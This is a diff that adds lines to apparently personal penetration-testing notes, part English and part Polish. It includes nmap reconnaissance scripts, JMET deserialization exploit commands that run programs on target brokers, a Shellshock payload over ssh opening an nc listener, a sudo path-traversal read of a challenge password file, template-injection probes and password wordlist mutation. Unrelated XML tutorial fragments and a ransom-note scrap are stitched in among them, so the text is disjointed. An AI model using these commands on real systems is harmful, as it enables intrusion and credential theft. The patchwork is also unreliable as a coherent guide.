@@ -9,4 +9,176 @@ mount read only:
 mount -o ro source:/data local/directory/
 
 
+A keylogger (logging every key pressed, as well as control characters such as Delete or Backspace)
+
+To find sub-domains: <= the dns-brute.nse script will find valid DNS (A) records by trying a list of common sub-domains and finding those that successfully resolve
+$nmap -p 80 --script dns-brute.nse vulnweb.com
+
+To find hosts on IP:
+$nmap -p 80 --script hostmap-bfk.nse nmap.or
+
+Traceroute Geolocation:
+$sudo nmap --traceroute --script traceroute-geolocation.nse -p 80 hackertarget.com
+
+http-enum.nse <= one of the more aggressive tests, the script effectively brute forces a web server path in order to discover web applications in use:
+$nmap --script http-enum 192.168.10.55
+
+445/tcp:
+smb-os-discovery 192.168.1.0/24
+$nmap -p 445 --script smb-os-discovery 192.168.1.0/24
+
+JMS Client (Producer) --- Connection --- Broker (Queue, Topic) --- Connection --- JMS Client (Consumer)
+
+Gadget mode:
+$java -jar jmet-0.1.0-all.jar -u test -pw test -Q cwqueue -I Artemins -Y xterm target 8080
+
+Running JMET against NNMI
+$java -jar jmet-0.1.0-all.jar -u admin -pw admin -T nms.discovery.configurationPoll -I HornetQ -Y calc target 4457
+
+$java -jar jmet-0.1.0-all.jar -I RabbitMQ 10.77.225.210 5671
+
+Next, make sure nothing is currently using port 80 or port 443
+$netstat -vantu | grep :80
+
+$netstat -alnp | grep ssh
+a all
+l list
+n number
+p ?
+
+http://resources.infosecinstitute.com/covering-tracks-of-attacks/
+
+You're files are now ***
+
+Tunneling is the process of encapsulating one protocol into another protocol. The protocol which is encapsulated is called the payload protocol and the protocol which encapsulates this protocol is called the delivery protocol.
+Tunneling can be used for bypassing firewall restrictions and can even be used for providing a secure path over untrusted networks.
+
+4 Step Checklist Methodology
+Recon: Explore the site, Spider it!, Discover default content, Enumerate criteria based parameters
+Analyze: Identify functionality, Identify entry points, Encoding mechanisms and data transmission, Technology stack used, Server fingerprinting, Code inspection
+Test: Enumeration test, Client side checks, Authentication test, Logic flaws, Session mismanagement, CSRF, Access controls, Input based tests, Server side tests, Miscellaneous tests
+Report: Observation, Risk/Impact, POC, Recommendation
+
+jxplorer - do ldap
+
+the known_hosts file lets the client authenticate the server, to check that it isn't connecting to an impersonator. The authorized_keys file lets the server authenticate the user.
+
+Tip: TFTPTheft, Metasploit, Viproy TFTP module
+
+Svmap is the common tool to enumerate the VoIP server and clients, it is available on Kali Linux, you can simply open the terminal on your machine and scan the entire network.
+$svmap 192.168.0.1/24
+SIP Device | User Agent | Fingerprint |
+
+snoopit - framework do testowania aplikacji
+
+Metasploit module for more confirmation to check whether any other devices using VoIP or not. The following module used to the situation:
+>use auxiliary/scanner/sip/options
+
+root@bt:/pentest/voip/smap# ./smap 192.168.1.104
+smap 0.6.0 http://www.wormulon.net/
+192.168.1.104: ICMP reachable, SIP enabled
+
+in powershell:
+>mstsc
+
+root-me.org
+
+in post:
+password[] = absdf
+
+$dmesg
+
+$lsusb
+
+Amazing logs:
+$journalctl -r
+
+ascii from hex:
+>>>"7061756c".decode("hex")
+'paul'
+
+ rO0 - to widzisz w burpie (to jest zwykła wartość base64)
+ ac ed - to jest hex - więc jak są krzaki jakieś w zapytaniu to trzeba patrzeć na zakładkę hex i wtedy szukać tego ciągu
+ 
+ w springu ja bym szukał template injection czyli wstrzyknięcie w jakiś parametr ${12*12} powinno Ci zwrócić wynik tego działania
+ 
+ What is XML Parsing?
+ Parsing XML refers to going through XML document to access data or to modify data in one or other way.
+ 
+ Template injection:
+ ${12*12}
+ $%00{12*12}
+ %{5+5}
+ {{6*6}}
+ #{4*4}
+ 
+ XML Stores New Line as LF
+ 
+ An expanded <date> element is used in the third example:
+ <note>
+  <date>
+    <year>2008</year>
+    <month>01</month>
+    <day>10</day>
+  </date>
+  <to>Tove</to>
+  <from>Jani</from>
+</note>
+ 
+What I'm trying to say here is that metadat (data about data) should be stored as attributes, and the data itself should be stored as elements.
+
+
+
+
+rmi: JMiniX Console
+
+We use the cewl tool to generate a wordlist from the website content. Command usage:
+$cewl -w /root/Desktop/words.txt -m 6 <Target>
+
+Now we used John the Ripper to apply its great ruleset, resulting in a list of mutated passwords. Command usage:
+$john -wordlist=words.txt -rules -stdout > words-john.txt
+
+$ssh noob@192.168.181.137 -i noob '() {:;}; nc -lvvp 1234'
+
+$sudo -u app-script-ch1-cracker cat /challenge/app-script/ch1/ch1/../ch1cracked/.passwd
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
